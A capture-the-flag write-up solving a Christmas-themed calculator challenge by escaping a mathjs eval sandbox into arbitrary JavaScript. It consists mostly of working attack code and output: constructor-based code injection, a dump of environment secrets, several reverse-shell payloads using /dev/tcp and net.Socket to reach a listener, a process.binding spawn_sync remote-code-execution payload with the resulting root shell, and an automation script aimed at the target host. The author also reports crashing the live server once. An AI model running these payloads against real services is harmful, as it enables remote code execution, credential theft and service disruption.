# Challenge

So the Grinch is trying to do some coding as well, and he has built this lovely scientific calculator!

Can you find the hidden secret?

https://grinchcalculator.ambitiousbeach-e7bbe16d.norwayeast.azurecontainerapps.io/

> **Hint:** Maybe you need to know alot about maths... or maybe trig?

# Writeup

First I overflow the input to figure out what language is behind it. Usually NodeJS throws a nice error:

```javascript
PayloadTooLargeError: request entity too large
    at readStream (/app/node_modules/raw-body/index.js:156:17)
    at getRawBody (/app/node_modules/raw-body/index.js:109:12)
    at read (/app/node_modules/body-parser/lib/read.js:79:3)
    at jsonParser (/app/node_modules/body-parser/lib/types/json.js:135:5)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)
    at /app/node_modules/express/lib/router/index.js:286:9
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    at expressInit (/app/node_modules/express/lib/middleware/init.js:40:5)
```

Quickly made a nodejs "terminal script" to continious input data.

Here is some of my findings

```bash
> sin^2x+cos^2x
{ error: { data: { fn: 'pow', index: 0, expected: [Array] } } }
> pow 1
{ error: { data: { fn: 'multiplyScalar', index: 0, expected: [Array] } } }
>
{ error: 'You need to send the expression as the exp query parameter...' }
> a=1; a+3
{ result: { mathjs: 'ResultSet', entries: [ 4 ] } }
```

Mathjs? Oh I know there is something useful here. lets try the cos.constructor

```bash
> abc
{ error: {} }
> cos
{}
> eval
{}
> floor
{}
```

So cos, eval, floor are returning somehting else than `{ result: x }`? Lets see if I can use them.

```bash
> eval("3+2")
{ result: 5 }
> eval.constructor
{}
> eval.constructor("test")
{}
> eval.constructor("test")()
{ error: {} }
> eval.constructor("return 1")()
{ result: 1 }
> eval.constructor("return Math.floor(3.12)")()
{ result: 3 }
```

Aiiee, so we're basically here running plain javascript code. Lets check process.env:

```bash
> eval.constructor("return process.env")()
{
  result: {
    CONTAINER_APP_HOSTNAME: 'grinchcalculator--eilaypv.ambitiousbeach-e7bbe16d.norwayeast.azurecontainerapps.io',
    KUBERNETES_SERVICE_PORT: '443',
    KUBERNETES_PORT: 'tcp://10.0.0.1:443',
    NODE_VERSION: '19.2.0',
    HOSTNAME: 'grinchcalculator--eilaypv-7fcb769b5d-8zzjt',
    YARN_VERSION: '1.22.19',
    IDENTITY_HEADER: 'cd580b65-8fa2-4dd7-8d80-29a1c4c54298',
    HOME: '/root',
    CONTAINER_APP_ENV_DNS_SUFFIX: 'ambitiousbeach-e7bbe16d.norwayeast.azurecontainerapps.io',
    CONTAINER_APP_REVISION: 'grinchcalculator--eilaypv',
    KUBERNETES_PORT_443_TCP_ADDR: '10.0.0.1',
    PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    KUBERNETES_PORT_443_TCP_PORT: '443',
    KUBERNETES_PORT_443_TCP_PROTO: 'tcp',
    MSI_ENDPOINT: 'http://localhost:42356/msi/token',
    MSI_SECRET: 'cd580b65-8fa2-4dd7-8d80-29a1c4c54298',
    CONTAINER_APP_PORT: '80',
    KUBERNETES_SERVICE_PORT_HTTPS: '443',
    KUBERNETES_PORT_443_TCP: 'tcp://10.0.0.1:443',
    IDENTITY_ENDPOINT: 'http://localhost:42356/msi/token',
    CONTAINER_APP_NAME: 'grinchcalculator',
    KUBERNETES_SERVICE_HOST: '10.0.0.1',
    PWD: '/app'
  }
}
```

Bingo! I smell a reverse shell! Google a nodejs reverse shell quickly:

```javascript
(()=>{
    var net = require('net'),
        cp = require('child_process'),
        sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect(8080, 'IP.ADDR.HERE', function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})()
```

Convert to oneline:

```bash
(()=>{var e,n=require('net'),t=require('child_process').spawn('/bin/sh',[]),p=new n.Socket;return p.connect(8080,'IP.ADDR.HERE',function(){p.pipe(t.stdin),t.stdout.pipe(p),t.stderr.pipe(p)}),/a/})()
```

No not so easy.!

```bash
> eval.constructor("return (()=>{var e,n=require('net'),t=require('child_process').spawn('/bin/sh',[]),p=new n.Socket;return p.connect(8080,'IP.ADDR.HERE',function(){p.pipe(t.stdin),t.stdout.pipe(p),t.stderr.pipe(p)}),/a/})()")()
{ error: {} }
```

More research, seems like require does not exist. We need to google an alterantive route.

```bash
> eval.constructor("return typeof require")()
{ result: 'undefined' }
```

Well we have access to process, so I found a website talking about process.binding('fs') which allows us to read files from the OS.

```bash
> eval.constructor("return (() => {buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer})()")()
upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection failure, transport failure reason: delayed connect error: 111
```

Woah, this seems to crash something at the server. 503 error and the site is down. Sorry! :)

Well I'm onto something.. But instead of crashing it I should maybe try figure out how to use it. I rewrote the eval.js script so I could just enter raw commands instead so it basically puts my input inside of the eval.constructor thing.

```javascript
$ buffer = Buffer.allocUnsafe(8192); return buffer.filter(el => el>31 && el <128).toString();
{"result":"$>'$>'buffere?P7'V.x:Bufferat?P7'ViallocUnsafe7'?P7' V{datfilterri?P7'PVelwArgs?P7'xV:@toString?P7'V&return (() => {buffer = Buffer.allocUnsafe(8192); return buffer.filter(el => el>31 && el <128).toString();})()?P7'Vnjs9args1?P7'XV&5fn @P7'VVh_test8@@P7'V0test9lefH@P7'V~signature0P@P7'VsignatureX@P7'@V:]signature1`@P7'pVbsignature2h@P7'Vz|signature3p@P7'V>7signature4x@P7'Vconvert0@P7'0Vyconvert@P7'XVbconvert1@P7'VjsBconvert2@P7'VLconvert3@P7'VOcos@P7'V^targ0@P7' Vz]7'0^_7']7'Vg?tg!$1#:~4|3~:q[7'q[7'q[7'q[7'LHAV@V`3IAvV)XV|1nvG':~4!$1#|3~:|(q[7'0q[7'q[7'q[7'q[7'q[7' q[7' q[7'']7'xR7'UNHH}H)HHBtHH#BtLEIHEHEOALEIHEHUH8@P7'|oHELEIHEHEQuuWHuLEM@'A@LEIHELEIHUSHH}H)HHBtHH#BtLEIHEHETALEEHAw2LEM@'A@PHuuIXIHLPABtI3IAvHuRLEIHEHEWAHELEIHEH@@P7'HUYI;uLEM@'A@ELEIHEHH@P7'HUZI;uLEM@'A@LEIHEHUHP@P7'|oHEHE[uuWHtLEM@'A@iHX@P7'HU]I;uLEM@'A@6H`@P7'HU^I;uLEM@'A@.LEIHELEIHU_HH}H)HHBtHH#BtLEIHEHE`ALEIHEHh@P7'HUbI;uLEM@'A@BLEIHEHp@P7'HUcI;uLEM@'A@LEIHELEIHUdHH}H)HHBtHH#BtLEIHEHEeALEIHEHUHx@P7'|oHELEIHEHEguuWHtLEM@'A@LEI?HEH@P7'HELEIHUiHEH@P7'HUjHEHEkuAHuPI@LEIHEHUH@P7'|oHELEIHEHEmuuWHuLEM@'A@LEIHELEIHUoHH}H)HHBtHH#BtLEIHEHEpALEEHAw2LEM@'A@PHuuIXIHLPABtI3IAvHuRLEIHEHUH@P7'oHELEIHELEIHEHEsAHEHEuuuuWHuLEM@'A@LEI?HEH@P7'HELEIHUwHEH@P7'HUxHEHEyuAHuPI@LEM@'A@$H@P7'HU{I;uLEM@'A@LEIHEHE|ALEI?HEH@P7'HELEIHU~HEH@P7'HUHEHEuAHuPI@IHSLEIHEHUH@P7'oHELEIHELEIHEHEAHELEIHEHEAHEHEuuuuWHuLEM@'A@nLEIHEHUH@P7'oHELEIHELEIHEHEAHELEIHEHEAHEHEuuuuWHtLEM@'A@jLEIHEHUH@P7'|oHELEIHEHEuuWHuLEM@'A@LEIHELEIHUHH}H)HHBtHH#BtLEIHEHEALEEHAw2LEM@'A@)PHuuIXIHLPABtI3IAvHuRLEIHEHUH@P7',oHELEIHEHEuuWHuLEM@'A@yLEIHEHUH@P7'\"oHH}H)HHBtHH#BtLEM@'A@gLEIHEHUH@P7'4oHH}H)HHBtHH#BtIH]SLEIHEHUH@P7'8oHH}H)HHBtHH#BtLEIHEb/S/d//S//S//'//l/S:/$//S?//'////(/7////(/7//d////(!/T?//d///(!///7//l/S:/$//S?//'//h///(!//'//d$//S/S//T$//S/S//t/////d&//S:/$//S?//'//d$//S?///7//l/S:/$//S?//'///S//'//d$//S/S/T/S//'//d/$//S/S//(//$/$//S/S//<///(/$/$/$//S/S//<///8/(//3//$//S/S/+//T//S//\\/S:/$//S/S///\\?/:/;//9//d/S/S/S//"}
```

This seems to just output a whole lot of data, maybe a way to dump memory from the box. Maybe I can see other users things. Oh well, I'll continue do research on how to pwn this box.

Found out that using process.binding you can bind to spawn_sync. Using this page [RCE in fast redact](https://itnext.io/how-i-exploited-a-remote-code-execution-vulnerability-in-fast-redact-9e69fa35572f) I see he is using the binding to create the spawn_sync command. So I steal this code and minimize it as shown below, start `nc -nlvp 1234` on my server and execute.

```javascript
spawn_sync=process.binding("spawn_sync"),normalizeSpawnArguments=function(t,i,e){if(Array.isArray(i)?i=i.slice(0):(e=i,i=[]),void 0===e&&(e={}),(e=Object.assign({},e)).shell){let r=[t].concat(i).join(" ");t="string"==typeof e.shell?e.shell:"/bin/sh",i=["-c",r]}"string"==typeof e.argv0?i.unshift(e.argv0):i.unshift(t);var n=e.env||process.env,o=[];for(var s in n)o.push(s+"="+n[s]);return{file:t,args:i,options:e,envPairs:o}},(spawnSync=function(){var t,i=normalizeSpawnArguments.apply(null,arguments),e=i.options;for(e.file=i.file,e.args=i.args,e.envPairs=i.envPairs,e.stdio=[{type:"pipe",readable:!0,writable:!1},{type:"pipe",readable:!1,writable:!0},{type:"pipe",readable:!1,writable:!0}],e.input&&((e.stdio[0]=util._extend({},e.stdio[0])).input=e.input),t=0;t<e.stdio.length;t++){var r=e.stdio[t]&&e.stdio[t].input;if(null!=r){var n=e.stdio[t]=util._extend({},e.stdio[t]);isUint8Array(r)?n.input=r:n.input=Buffer.from(r,e.encoding)}}console.log(e);var o=spawn_sync.spawn(e);if(o.output&&e.encoding&&"buffer"!==e.encoding)for(t=0;t<o.output.length;t++)o.output[t]&&(o.output[t]=o.output[t].toString(e.encoding));return o.stdout=o.output&&o.output[1],o.stderr=o.output&&o.output[2],o.error&&(o.error=o.error+"spawnSync "+i.file,o.error.path=i.file,o.error.spawnargs=i.args.slice(1)),o})("/bin/bash",["-c","bash -i >& /dev/tcp/IP/1234 0>&1 &"]);
```

```bash
Listening on 0.0.0.0 1234
Connection received on 20.100.250.159 5024
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@grinchcalculator--eilaypv-7fcb769b5d-ggq25:/app# ls -lah
ls -lah
total 68K
drwxr-xr-x  1 root root 4.0K Dec 15 11:30 .
drwxr-xr-x  1 root root 4.0K Dec 15 11:11 ..
-rw-r--r--  1 root root  653 Dec 13 03:24 index.js
drwxr-xr-x 65 root root 4.0K Dec 13 03:25 node_modules
-rw-r--r--  1 root root  43K Dec 13 03:25 package-lock.json
-rw-r--r--  1 root root  279 Dec 13 03:24 package.json
drwxr-xr-x  2 root root 4.0K Dec 13 03:25 static
```

Bingo! Bash access granted. Now just look for the flag, started by catting the index.js file:


```javascript
const math = require("mathjs");
const express = require("express");
const path = require("path");
const flag = "${#N3V3R_7RU5T_L|B5_743Y_@R3_3V|7}";
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "static")));
app.post("/evaluate",(req,res)=>{
    if(!req.body.exp){
        res.status(400).json({"error":"You need to send the expression as the exp query parameter..."});
    }
    try{
        let result = math.eval(req.body.exp);
        res.status(200).json({"result": result});
    } catch(error){
        res.status(400).json({"error":error});
    }
});

app.listen(80, ()=>{
    console.log("Up!");
});
```

# For those interested here is my eval.js script

To use it you can just enter regular commands as on the calculator on the website. It will return the same. But to exploit the remote js execution command just write "fn" to swap to function mode where it automatically injects the javascript and evaluates it.

So > means eval mode (math.js eval)
annd $ means javascript mode. 

```javascript
const readline = require('readline');
const http = require('http');

const defaultOptions = {
    host: 'grinchcalculator.ambitiousbeach-e7bbe16d.norwayeast.azurecontainerapps.io',
    port: 80,
    headers: { 'Content-Type': 'application/json' }
}

const post = (path, payload) => new Promise((resolve, reject) => {
    const options = { ...defaultOptions, path, method: 'POST' };
    const req = http.request(options, res => {
        let buffer = "";
        res.on('data', chunk => buffer += chunk)
        res.on('end', () => resolve(buffer))
    });
    req.on('error', e => reject(e.message));
    req.write(JSON.stringify(payload));
    req.end();
});

var rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let history = [];

rl.on('line', async (input) => {
    if(input == "fn") { rl.setPrompt("$ "); rl.prompt(true); return true; }
    if(input == "ev") { rl.setPrompt("> "); rl.prompt(true); return true; }

    if (rl.getPrompt() == "$ ") {
        history.push(input);
        input = `eval.constructor("return (() => {${input.replace(/(["'])/g, "\\$1")}})()")()`;
        let data = await post("/evaluate", { exp: input })
        console.log(data);
    } else {
        history.push(input);
        let data = await post("/evaluate", { exp: input })
        console.log(data);
    }
    rl.prompt(true);
});

rl.on('keypress', (str, key) => {
    if (key.name === 'up' && history.length > 0) {
        const previousCommand = history[history.length - 1];
        rl.setInput(previousCommand);
    } else if (key.name === 'down' && history.length > 0) {
        const nextCommand = history[history.length - 1];
        rl.setInput(nextCommand);
    }
});

console.log("Started eval script.");
console.log("Commands: fn, ev");
rl.prompt();
```

# Example

```bash
Started eval script.
Commands: fn, ev
> 1+1
{"result":2}
> fn
$ let x = 1; x++; return x;
{"result":2}
$ ev
> 1+1
{"result":2}
> 
```

# Ways to make it easier..

After seeing others results I see that i could have done this in a much shorter method.

```javascript
cos.constructor("return process.mainModule.require('child_process').spawnSync('/bin/bash', ['-c', 'bash -i >& /dev/tcp/IP/1234 0>&1 &'])")()
```
